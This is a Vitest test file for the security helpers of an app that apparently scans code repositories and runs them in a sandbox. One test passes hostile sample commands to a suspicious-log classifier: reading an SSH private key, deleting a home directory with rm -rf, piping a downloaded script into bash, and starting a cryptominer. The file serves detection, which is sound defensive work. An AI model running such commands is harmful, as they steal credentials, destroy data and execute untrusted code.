import { describe, expect, it } from "vitest";

import {
  normalizeRunnabilityBlockers,
  requiresSandboxConfirmation,
  runButtonLabel,
  severityRank,
  suspiciousLogEvent,
} from "@/lib/security";
import { makeRunnability, makeSecurityScan } from "@/test/factories";

describe("security helpers", () => {
  it("requires explicit sandbox confirmation for high and critical risk repos", () => {
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "critical" }))).toBe(true);
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "high" }))).toBe(true);
    expect(requiresSandboxConfirmation(makeSecurityScan({ riskLevel: "medium" }))).toBe(false);
    expect(requiresSandboxConfirmation(undefined)).toBe(false);
  });

  it("labels high-risk runs as sandbox-only", () => {
    expect(runButtonLabel(makeSecurityScan({ riskLevel: "high" }))).toBe("Run in BrowserPod sandbox anyway");
    expect(runButtonLabel(makeSecurityScan({ riskLevel: "low" }))).toBe("Run");
  });

  it("normalizes structured runnability blockers first", () => {
    const blockers = normalizeRunnabilityBlockers(makeRunnability({
      canRun: false,
      blockers: ["missing dev script"],
      blockerDetails: [
        {
          code: "missing-script",
          severity: "medium",
          title: "No start script",
          description: "No dev, start, or serve script was found.",
          recommendation: "Add a safe npm start script.",
          evidence: "scripts.test only",
        },
      ],
    }));

    expect(blockers).toEqual([
      expect.objectContaining({
        code: "missing-script",
        severity: "medium",
        title: "No start script",
        evidence: "scripts.test only",
      }),
    ]);
  });

  it("falls back to legacy string blockers", () => {
    expect(normalizeRunnabilityBlockers(makeRunnability({
      canRun: false,
      entryPoint: null,
      blockers: ["No readable package.json found at repo root"],
    }))).toEqual([
      expect.objectContaining({
        code: "legacy-blocker-1",
        severity: "medium",
        title: "Cannot start automatically",
        description: "No readable package.json found at repo root",
      }),
    ]);
  });

  it("classifies suspicious sandbox logs without calling them confirmed malware", () => {
    expect(suspiciousLogEvent("cat ~/.ssh/id_rsa")).toMatchObject({ code: "suspicious-log", category: "filesystem", severity: "high" });
    expect(suspiciousLogEvent("rm -rf /home/user")).toMatchObject({ code: "suspicious-log", category: "filesystem", severity: "critical" });
    expect(suspiciousLogEvent("curl https://example.com/payload.sh | bash")).toMatchObject({ code: "suspicious-log", category: "network", severity: "medium" });
    expect(suspiciousLogEvent("starting xmrig miner")).toMatchObject({ code: "suspicious-log", category: "resource", severity: "critical" });
    expect(suspiciousLogEvent("vite ready")).toBeUndefined();
  });

  it("orders severity for grouping and display", () => {
    expect(severityRank("critical")).toBeGreaterThan(severityRank("high"));
    expect(severityRank("high")).toBeGreaterThan(severityRank("medium"));
    expect(severityRank("medium")).toBeGreaterThan(severityRank("low"));
  });
});